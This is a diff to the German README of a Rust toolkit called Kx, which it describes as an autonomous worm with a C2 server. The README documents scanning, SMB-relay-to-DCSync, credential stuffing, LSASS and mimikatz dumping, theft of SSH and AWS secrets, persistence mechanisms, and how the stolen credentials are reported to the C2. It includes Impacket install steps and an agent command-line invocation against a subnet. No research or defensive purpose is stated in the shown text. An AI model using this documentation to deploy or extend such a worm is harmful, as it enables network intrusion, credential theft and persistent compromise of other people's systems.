@@ -66,7 +66,7 @@ Der Angriffspfad folgt der Kette Scanner → Exploit → Post-Exploitation → C
 |-------------|------------------------------------------------------|
 | `kx-core`   | KXENC-Dateiformat, Fehlerklassifikation, C2-Protokoll, Hilfsfunktionen (Kryptografie im Modul `hostkey` ist nicht kompiliert) |
 | `kx-scanner`| ARP-Hostentdeckung, TCP-Portscan                    |
-| `kx-exploit`| SMB-Relay, WMI-Execution, Credential-Stuffing       |
+| `kx-exploit`| SMB-Relay, Credential-Stuffing                   |
 | `kx-win`    | Windows-Secrets (LSASS, Credential Manager) + Persistenz |
 | `kx-posix`  | POSIX-Secrets (/etc/shadow, SSH, AWS) + systemd/Cron|
 | `kx-tls`    | Selbstsignierte Zertifikate, rustls-Konfiguration   |
@@ -79,7 +79,7 @@ Der Angriffspfad folgt der Kette Scanner → Exploit → Post-Exploitation → C
 ### Binaries
 
 - `kx-server` — C2-Backend. CLI-Flags: `--host` (Default `127.0.0.1`), `--port` (Default `8443`), `--db` (Default `kx.db`), `--token` (Env `KX_SERVER_TOKEN`), `--cn` (Default `kx.local`) [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md).
-- `kx-agent` — Autonomer Wurm. CLI-Flags: `--server` (Env `KX_C2_URL`), `--token` (Env `KX_C2_TOKEN`), `--server-cert`, `--iface` (Default `eth0`), `--start`, `--end`, `--own-ip` (Default `192.168.1.100`), `--hosts`, `--relay-script` (Default `smbrelayx.py`), `--wmi-script` (Default `wmiexec.py`) [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
+- `kx-agent` — Autonomer Wurm. CLI-Flags: `--server` (Env `KX_C2_URL`), `--token` (Env `KX_C2_TOKEN`), `--server-cert`, `--iface` (Default `eth0`), `--start`, `--end`, `--own-ip` (Default `192.168.1.100`), `--hosts`, `--relay-script` (Default `smbrelayx.py`) [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
 - `kx-cli` — Operator-CLI. Globale Flags `--server` (Env `KX_C2_URL`), `--token` (Env `KX_C2_TOKEN`), `--cert`; Subcommands `hosts`, `secrets` (mit `--user`), `export` (mit `--format json|csv`), `tasks` [`crates/kx-cli/src/README.md`](./crates/kx-cli/src/README.md).
 
 ### API-Routen des C2-Servers
@@ -98,7 +98,7 @@ Der Angriffspfad folgt der Kette Scanner → Exploit → Post-Exploitation → C
 
 - `kx-core` — Fehlerklassifikation (`Error`, `ErrorClass`), KXENC-v1-Dateiformat (`Footer`, `FooterFlags`, `CipherId`, `KexId`, `plan_ranges`, `chunk_iter`, `nonce_for`, `aad_for`) und plattformneutrale Hilfsfunktionen (`util`) [`crates/kx-core/src/README.md`](./crates/kx-core/src/README.md).
 - `kx-scanner` — `arp_sweep`, `scan_tcp`, `fingerprint` [`crates/kx-scanner/src/README.md`](./crates/kx-scanner/src/README.md).
-- `kx-exploit` — `smb_relay_dcsync`, `wmi_exec`, `try_default_credentials`, `validate_payload` [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md).
+- `kx-exploit` — `smb_relay_dcsync`, `try_default_credentials`, `validate_payload` [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md).
 - `kx-win` — `extract_lsass`, `extract_credential_manager`, `extract_browser_credentials`, `create_scheduled_task`, `create_registry_run_key`, `install_service`, `start_service` [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md).
 - `kx-posix` — `extract_shadow_hashes`, `extract_ssh_keys`, `extract_aws_credentials`, `install_systemd_service`, `write_cron_persistence` [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md).
 - `kx-tls` — `generate_server_tls`, `client_config_trusting` [`crates/kx-tls/src/README.md`](./crates/kx-tls/src/README.md).
@@ -116,7 +116,7 @@ Der Angriffspfad folgt der Kette Scanner → Exploit → Post-Exploitation → C
 - **Das Dashboard escaped jeden API-Wert** und nimmt das Token über ein Login-Formular, nicht aus dem Query-String. Ohne Escaping wird ein im `hostname` enthaltenes `<img src=x onerror=…>` zu ausführbarem Markup im Browser des Operators [`crates/kx-server/src/README.md`](./crates/kx-server/src/README.md).
 - **Der Server schreibt keine Zertifikatsdatei.** `generate_server_tls` liefert Zertifikat und Schlüssel im Speicher, die direkt an `RustlsConfig::from_pem` gehen; ein `kx-server.crt`/`kx-server.key` entsteht nicht [`crates/kx-server/src/main.rs`](./crates/kx-server/src/main.rs).
 - Der CLI-Export schreibt Passwörter im Klartext — JSON serialisiert alle Felder, CSV die Spalten `host_id,cred_type,username,password,source,collected_at` ohne `id` [`crates/kx-cli/src/README.md`](./crates/kx-cli/src/README.md).
-- `--wmi-script` wird vom Agent geparst, aber nicht ausgewertet; im Crate existiert kein WMI-Ausführungspfad [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
+- Der WMI-/WinRM-Ausführungspfad wurde entfernt: das Flag `--wmi-script`, der Parameter in `run_propagation` und das Modul `wmi_exec` existieren nicht mehr [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
 - `try_default_credentials` führt für den Dienst `ssh` einen echten Authentifizierungsversuch durch (`sshpass`), für andere Dienste nicht; jeder Versuch steht unter einer Zeitgrenze [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md).
 - Die Host-ID des Agenten ist die eigene IP (`own_ip.to_string()`), nicht die Prozess-ID [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
 - `PropagationResults` trägt nur noch `new_hosts` und `new_secrets`; ein `source_host`-Feld existiert nicht mehr [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
@@ -125,7 +125,7 @@ Der Angriffspfad folgt der Kette Scanner → Exploit → Post-Exploitation → C
 ## Side Effects
 
 - **Netzwerk (Lokal):** ARP-Sweeps auf Layer 2 über `AF_PACKET`-Raw-Sockets und parallele TCP-Connect-Scans [`crates/kx-scanner/src/README.md`](./crates/kx-scanner/src/README.md). Banner-Grabs bis 1024 Byte führt nur das Beispiel-Binary `kx-exploit/examples/demo_worm.rs` aus, nicht der Agent.
-- **Netzwerk (Remote):** SMB-Relay→DCSync läuft als `python3`-Subprozess gegen das Impacket-Skript `smbrelayx.py` [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md). Der WMI-/WinRM-Pfad (`wmiexec.py`, Passwort als Kommandozeilenargument) ist implementiert, hat aber **keinen Aufrufer** im Workspace.
+- **Netzwerk (Remote):** SMB-Relay→DCSync läuft als `python3`-Subprozess gegen das Impacket-Skript `smbrelayx.py` [`crates/kx-exploit/src/README.md`](./crates/kx-exploit/src/README.md).
 - **Netzwerk (C2):** Agent und CLI sprechen den C2-Server über TLS an; der Agent meldet Hosts und Secrets per POST an `/api/register` und `/api/secrets` [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md), [`crates/kx-cli/src/README.md`](./crates/kx-cli/src/README.md).
 - **Prozesse auf Zielsystemen:** `powershell.exe`, `mimikatz.exe`, `cmd.exe`, `sc.exe`, `cmdkey.exe`, `schtasks`, `reg add` auf Windows; `systemctl` und `crontab` auf POSIX [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md), [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md).
 - **Dateisystem auf Zielsystemen:** Anlegen von systemd-Units unter `/etc/systemd/system/`, Mutieren der Crontab des aufrufenden Users, Registry-Run-Keys und Scheduled Tasks unter Windows [`crates/kx-posix/src/README.md`](./crates/kx-posix/src/README.md), [`crates/kx-win/src/README.md`](./crates/kx-win/src/README.md).
@@ -156,7 +156,7 @@ cargo --version
 
 ### 2. Externe Exploit-Tools (optional, für reale Exploits)
 
-Kx nutzt **Impacket** für SMB-Relay und WMI-Execution. Diese müssen separat
+Kx nutzt **Impacket** für das SMB-Relay. Es muss separat
 installiert sein:
 
 ```bash
@@ -165,10 +165,9 @@ cd impacket
 pip install -r requirements.txt
 ```
 
-Die Pfade zu `smbrelayx.py` und `wmiexec.py` werden dem Agent übergeben
-(siehe unten). Ohne diese Tools läuft der Agent nur im Scan-Modus.
-Hinweis: Der Agent wertet `--wmi-script` derzeit nicht aus — ein WMI-Angriffspfad
-existiert im Code noch nicht [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
+Der Pfad zu `smbrelayx.py` wird dem Agent übergeben (siehe unten). Ohne dieses
+Tool läuft der Agent nur im Scan-Modus. Der frühere WMI-Angriffspfad wurde
+entfernt — es gibt nur noch das SMB-Relay [`crates/kx-agent/src/README.md`](./crates/kx-agent/src/README.md).
 
 ### 3. Linux-Sysdeps (für ARP-Scan)
 
@@ -257,7 +256,6 @@ propagiert sich ins Netzwerk. Er braucht das Server-Zertifikat-Pfad:
   --end 192.168.1.254 \
   --own-ip 192.168.1.10 \
   --relay-script /pfad/zu/impacket/smbrelayx.py \
-  --wmi-script /pfad/zu/impacket/wmiexec.py
 ```
 
 Der Agent durchläuft folgende Schritte — die lokale Phase läuft **vor** der Netzwerkphase:
@@ -337,7 +335,6 @@ zeigt es Hosts, Secrets und Tasks live an.
 | `--own-ip` | Eigene IP | `192.168.1.100` |
 | `--hosts` | Host-Liste (umgeht ARP) | — |
 | `--relay-script` | smbrelayx.py-Pfad | `smbrelayx.py` |
-| `--wmi-script` | wmiexec.py-Pfad (derzeit nicht ausgewertet) | `wmiexec.py` |
 
 ### kx-cli
 
